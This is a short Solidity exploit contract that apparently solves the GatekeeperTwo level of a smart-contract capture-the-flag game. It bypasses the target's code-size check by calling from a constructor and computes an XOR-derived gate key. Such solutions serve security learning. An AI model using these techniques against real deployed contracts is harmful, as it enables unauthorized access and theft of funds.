// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";

import "./Level14.sol";

contract Attack {
    constructor(GatekeeperTwo _instance) {
        console2.log("Attack constructor");
        uint256 x;
        address me = address(this);
        assembly {
            x := extcodesize(me)
        }
        console2.log("x", x);
        console2.log("msg.sender", msg.sender);
        console2.log("me", me);
        bytes8 a = bytes8(keccak256(abi.encodePacked(address(this))));
        // address(this) because msg.sender is the contract was created
        bytes8 filter = 0xFFFFFFFFFFFFFFFF;
        bytes8 b = a ^ filter;
        _instance.enter(b);
    }
}
